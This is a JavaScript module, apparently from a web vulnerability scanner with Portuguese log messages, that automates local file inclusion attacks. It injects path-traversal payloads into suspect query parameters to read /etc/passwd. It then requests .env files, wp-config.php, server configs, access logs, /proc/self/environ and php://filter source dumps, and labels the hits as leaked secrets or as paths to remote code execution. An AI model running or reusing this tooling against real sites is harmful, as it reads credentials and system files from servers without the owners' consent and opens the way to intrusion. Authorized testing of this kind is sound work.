import { curlWebSingle } from './web-curl-single.js';

const SUSPECT_PARAM_RE = /^(file|filepath|path|page|include|inc|template|view|doc|folder|root|lang|style|module|load|download|dir)$/i;
const PASSWD_PAYLOADS = [
  '/etc/passwd',
  '../etc/passwd',
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '%2fetc%2fpasswd',
];

const CONTEXT_PAYLOADS = [
  '/proc/self/environ',
  '/var/log/apache2/access.log',
  '/var/log/nginx/access.log',
  '/var/www/html/.env',
  '/var/www/.env',
  '/var/www/html/wp-config.php',
  '/var/www/html/config.php',
  '/etc/nginx/nginx.conf',
  '/etc/apache2/apache2.conf',
  'php://filter/convert.base64-encode/resource=index.php',
  'php://filter/convert.base64-encode/resource=wp-config.php',
];

function looksLikePasswdDump(bodyText) {
  const t = String(bodyText || '').toLowerCase();
  return t.includes('root:x:0:0:') || t.includes('daemon:x:1:1:') || t.includes('/bin/bash') || t.includes('/usr/sbin/nologin');
}

function uniqueQueryUrls(urls) {
  const out = [];
  const seen = new Set();
  for (const u of urls || []) {
    try {
      const x = new URL(String(u || ''));
      if (!x.search) continue;
      x.hash = '';
      const k = x.href;
      if (seen.has(k)) continue;
      seen.add(k);
      out.push(x.href);
    } catch {
      /* ignore */
    }
  }
  return out;
}

export async function runLfiPasswdProbe({
  urls,
  log,
  maxAttempts = 24,
  timeoutMs = 12000,
  maxBodyBytes = 180_000,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const results = [];
  let attempts = 0;

  const queryUrls = uniqueQueryUrls(urls);
  for (const base of queryUrls) {
    if (attempts >= maxAttempts) break;
    let u;
    try {
      u = new URL(base);
    } catch {
      continue;
    }
    const suspectParams = [...u.searchParams.keys()].filter((k) => SUSPECT_PARAM_RE.test(String(k || '').trim()));
    if (!suspectParams.length) continue;

    for (const p of suspectParams) {
      if (attempts >= maxAttempts) break;
      for (const payload of PASSWD_PAYLOADS) {
        if (attempts >= maxAttempts) break;
        attempts += 1;
        const test = new URL(u.href);
        test.searchParams.set(p, payload);
        const testUrl = test.href;
        try {
          logger(`[lfi] teste passwd: ${testUrl}`, 'info');
          const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
          if (!r || !r.bodyText) continue;
          if (!looksLikePasswdDump(r.bodyText)) continue;

          results.push({
            ok: true,
            baseUrl: u.href,
            testUrl,
            param: p,
            payload,
            status: Number(r.status) || 0,
            evidence: 'assinatura /etc/passwd no corpo',
            snippet: String(r.bodyText).slice(0, 200).replace(/\s+/g, ' ').trim(),
          });
          break;
        } catch {
          /* ignore network errors */
        }
      }
    }
  }

  return { attempts, hits: results };
}

function looksLikeLfiContext(bodyText, payload) {
  const t = String(bodyText || '').toLowerCase();
  if (!t) return false;
  if (payload.includes('/proc/self/environ')) {
    return t.includes('http_user_agent') || t.includes('server_name=') || t.includes('path=') || t.includes('document_root');
  }
  if (payload.includes('access.log')) {
    return t.includes('get /') || t.includes('post /') || t.includes('http/1.1');
  }
  if (payload.endsWith('.env')) {
    return t.includes('db_password=') || t.includes('app_key=') || t.includes('secret_key=') || t.includes('mysql_password=');
  }
  if (payload.includes('wp-config.php') || payload.endsWith('config.php')) {
    return t.includes('db_name') || t.includes('db_user') || t.includes('db_password') || t.includes('define(');
  }
  if (payload.endsWith('nginx.conf') || payload.endsWith('apache2.conf')) {
    return t.includes('server {') || t.includes('virtualhost') || t.includes('documentroot');
  }
  if (payload.startsWith('php://filter')) {
    return /[a-z0-9+/=]{120,}/i.test(String(bodyText || ''));
  }
  return false;
}

function classifyLfiContext(payload, snippet) {
  const p = String(payload || '').toLowerCase();
  const s = String(snippet || '').toLowerCase();
  if (p.includes('/proc/self/environ')) {
    return { level: 'potential_rce', label: 'potencial RCE (environ injection path)' };
  }
  if (p.includes('access.log') || p.includes('error.log')) {
    return { level: 'potential_rce', label: 'potencial RCE (log poisoning path)' };
  }
  if (p.startsWith('php://filter')) {
    return { level: 'potential_rce', label: 'potencial RCE (wrapper/php source disclosure)' };
  }
  if (s.includes('db_password') || s.includes('app_key') || s.includes('secret_key')) {
    return { level: 'read', label: 'leitura sensível (config/segredos)' };
  }
  return { level: 'read', label: 'leitura simples' };
}

export async function runLfiContextProbe({
  lfiHits,
  log,
  timeoutMs = 12000,
  maxBodyBytes = 220000,
  maxAttempts = 18,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const hits = [];
  let attempts = 0;
  const bases = Array.isArray(lfiHits) ? lfiHits.slice(0, 6) : [];

  for (const baseHit of bases) {
    const baseUrl = String(baseHit?.baseUrl || baseHit?.testUrl || '');
    const param = String(baseHit?.param || '').trim();
    if (!baseUrl || !param) continue;
    for (const payload of CONTEXT_PAYLOADS) {
      if (attempts >= maxAttempts) break;
      attempts += 1;
      try {
        const u = new URL(baseUrl);
        u.searchParams.set(param, payload);
        const testUrl = u.href;
        logger(`[lfi-context] ${param}=${payload} @ ${baseUrl}`, 'info');
        const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
        const bt = String(r?.bodyText || '');
        if (!bt || !looksLikeLfiContext(bt, payload)) continue;
        const snippet = bt.slice(0, 240).replace(/\s+/g, ' ').trim();
        const cls = classifyLfiContext(payload, snippet);
        hits.push({
          baseUrl,
          testUrl,
          param,
          payload,
          status: Number(r?.status) || 0,
          evidence: `context-hit:${payload}`,
          snippet,
          classification: cls.level,
          classificationLabel: cls.label,
        });
      } catch {
        // ignore
      }
    }
    if (attempts >= maxAttempts) break;
  }

  return { attempts, hits };
}
